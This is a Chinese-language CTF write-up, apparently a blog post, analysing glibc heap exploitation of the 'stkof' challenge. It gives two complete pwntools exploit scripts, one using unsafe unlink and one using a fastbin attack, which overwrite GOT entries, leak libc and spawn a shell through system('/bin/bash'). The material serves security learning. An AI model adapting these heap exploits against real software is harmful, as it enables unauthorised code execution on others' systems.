---
title: 浅析 linux_heap 利用
categories:
  - linux_pwn
tags:
  - Null
---

在今年早些时候，我曾看过 `house of orange` 这中利用方式，但是当时并没有完完整整的读过 `malloc`、`free`、`malloc_consolidate` 等有关于内存分配的函数。

最近读了这些函数的源码，但是发现代码量有点大啊，逐行的分析可能有点麻烦（主要是懒），所以我决定以题目的实际情况做具体利用分析，有什么不对的地方望大佬指出。



# 0x1 漏洞原理

`linux` 堆利用的漏洞原理，可以看 [`how2heap`](<https://github.com/shellphish/how2heap>) 上面的一些讲解，以及通过 `glibc` 源码进行具体分析，这里就不进行赘述了。



# 0x2 漏洞利用

好吧，我们直接开始刷题吧。



## 0x21 stkof && unlink && fastbin attack

日常 `checksec` ：

```sh
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

从这里我们可以知道程序并没有开启 `PIE` ，还可以写入 `got` 表。

### 0x211 程序分析

首先分析一下整个程序的流程。

![stkof_process](/image/2019-05-24-linux_pwn_heap/stkof_process.png)

这里所有的 chunk 在 `bss` 有一个变量（`chunk_ptr_list`）进行统一的存储，存在一个 `chunk` 的计数器。

这里可以利用的地方主要有三个。

1. 存在创建任意大小的 `chunk` 。
2. 可以给我们所创建的 `chunk` 写入任意大小的字符串（`heap_overflow`）。
3. `chunk` 的计数器在创建 `chunk` 的时候增加，删除 `chunk` 的时候，没有变化？



### 0x212 漏洞利用

这里我想到了两种稍微简单的利用思路，这里总结一下。

##### 第一种思路 && unsafe_unlink

1. 创建三个属于 `smallbin` 链表的 `chunk`，
2. 通过 `heap_overflow` 将第二个 `chunk` 置为 `free` 状态。
3. 使用 `unlink` 将 `bss` 段上存储第二个 `chunk` 的位置覆盖为  `chunk_ptr_list - 0x8`
4. 这个时候我们可以对 `chunk_ptr_list[2]` 进行写入，覆盖掉整个 `chunk_ptr_list`。

```c
chunk_ptr_list[1] = free_got;
chunk_ptr_list[2] = atol_got;
chunk_ptr_list[3] = puts_got;
```

5. 将 `free_got` 修改为 `puts_plt`，然后调用 `free`（`puts_got`） 释放掉 `chunk_ptr_list[3]`，得到 `libc` 的基地址。
6. 通过 `libc` 的基地址得到 `system` 函数的地址，然后使用 `4` 调用 `atol` 函数，输入 `/bin/bash` 得到 `shell`。

`poc` ：

```python
# -*- coding: utf-8 -*-
# !/usr/bin/python env
from pwn import *


def make_chunk(exp_file, chunk_size):
    exp_file.sendline("1")
    exp_file.sendline(str(chunk_size))
    exp_file.recvuntil("OK")


def write_chunk(exp_file, chunk_nums, write_length, write_value):
    exp_file.sendline("2")
    exp_file.sendline(str(chunk_nums))
    exp_file.sendline(str(write_length))
    exp_file.send(str(write_value))
    exp_file.recvuntil("OK")


def delete_chunk(exp_file, chunk_nums,):
    exp_file.sendline("3")
    exp_file.sendline(str(chunk_nums))
    exp_file.recvuntil("OK")


def main():
    debug = 1
    if debug:
        exp_file = process("/root/Desktop/a679df07a8f3a8d590febad45336d031-stkof")
        elf_file = ELF("/root/Desktop/a679df07a8f3a8d590febad45336d031-stkof")
        libc_file = ELF("/lib/x86_64-linux-gnu/libc.so.6")

    # use unsafe_unlink to changed the address of chunk_ptr_list[2] to &chunk_ptr_list - 0x8
    make_chunk(exp_file, 0x20)
    make_chunk(exp_file, 0x100)
    make_chunk(exp_file, 0x100)
    payload_1 = p64(0x0) + p64(0x100)
    payload_1 += p64(0x0000000000602140 + 0x10 - 0x18) + p64(0x0000000000602140 + 0x10 - 0x10)
    payload_1 += "a" * (0x100 - 0x20)
    payload_1 += p64(0x100) + p64(0x110)
    write_chunk(exp_file, 2, 0x110, payload_1)
    delete_chunk(exp_file, 3)

    # Change the free_got to puts_plt, and get the base address of libc.
    payload_2 = p64(0x1) * 2 + p64(elf_file.got['free']) + p64(elf_file.got['atol']) + p64(elf_file.got['puts'])
    write_chunk(exp_file, 2, 0x28, payload_2)
    payload_3 = p64(elf_file.plt['puts'])
    write_chunk(exp_file, 1, 0x8, payload_3)
    exp_file.sendline("3")
    exp_file.sendline(str(3))
    libc_addr = u64(exp_file.recvuntil("OK")[1:7] + "\x00\x00") - libc_file.symbols['puts']
    system_addr = libc_file.symbols['system'] + libc_addr

    # Change the atol_got to system_addr
    payload_4 = p64(system_addr)
    write_chunk(exp_file, 2, 0x8, payload_4)

    # Trigger system("/bin/bash")
    exp_file.sendline("4")
    exp_file.sendline("/bin/bash")

    exp_file.interactive()


if __name__ == '__main__':
    main()
```



##### 第二种思路 && fastbin attack

1. 利用 `heap_overflow` 修改 `fastbin` 链表将 chunk 分配到 `bss` 段
2. 然后利用 `2` 进行任意长度输入，覆盖掉整个 `chunk_ptr_list` 。

```c
chunk_ptr_list[1] = free_got;
chunk_ptr_list[2] = atol_got;
chunk_ptr_list[3] = puts_got;
```

3. 剩下的和 第一种思路 相同。

`poc` ：

```python
# -*- coding: utf-8 -*-
# !/usr/bin/python env
from pwn import *


def make_chunk(exp_file, chunk_size):
    exp_file.sendline("1")
    exp_file.sendline(str(chunk_size))
    exp_file.recvuntil("OK")


def write_chunk(exp_file, chunk_nums, write_length, write_value):
    exp_file.sendline("2")
    exp_file.sendline(str(chunk_nums))
    exp_file.sendline(str(write_length))
    exp_file.send(str(write_value))
    exp_file.recvuntil("OK")


def delete_chunk(exp_file, chunk_nums):
    exp_file.sendline("3")
    exp_file.sendline(str(chunk_nums))
    exp_file.recvuntil("OK")


def main():
    debug = 1
    if debug:
        exp_file = process("/root/Desktop/a679df07a8f3a8d590febad45336d031-stkof")
        elf_file = ELF("/root/Desktop/a679df07a8f3a8d590febad45336d031-stkof")
        libc_file = ELF("/lib/x86_64-linux-gnu/libc.so.6")

    # make many chunk becouse we need change the chunk_ptr_counts to 0x21
    make_chunk(exp_file, 0x100)
    for counts in range(0x2, 0x21):
        make_chunk(exp_file, 0x10)

    # use fastbin attack alloc the chunk to &chunk_ptr_counts - 0x8
    delete_chunk(exp_file, 0x11)
    payload_1 = p64(0x0) * 2
    payload_1 += p64(0x0) + p64(0x21)
    payload_1 += p64(0x0000000000602100 - 0x8) * 1 + p64(0x1)
    write_chunk(exp_file, 0x10, 0x30, payload_1)
    make_chunk(exp_file, 0x10)
    make_chunk(exp_file, 0x10)

    # Change the free_got to puts_plt, and get the base address of libc.
    payload_2 = p64(0x11) * 8 + p64(elf_file.got['free']) + p64(elf_file.got['atol']) + p64(elf_file.got['puts'])
    write_chunk(exp_file, 0x22, 0x58, payload_2)
    payload_3 = p64(elf_file.plt['puts'])
    write_chunk(exp_file, 1, 0x8, payload_3)
    exp_file.sendline("3")
    exp_file.sendline(str(3))
    libc_addr = u64(exp_file.recvuntil("OK")[1:7] + "\x00\x00") - libc_file.symbols['puts']
    system_addr = libc_file.symbols['system'] + libc_addr

    # Change the atol_got to system_addr
    payload_4 = p64(system_addr)
    write_chunk(exp_file, 2, 0x8, payload_4)

    # Trigger system("/bin/bash")
    exp_file.sendline("4")
    exp_file.sendline("/bin/bash")

    exp_file.interactive()


if __name__ == '__main__':
    main()
```



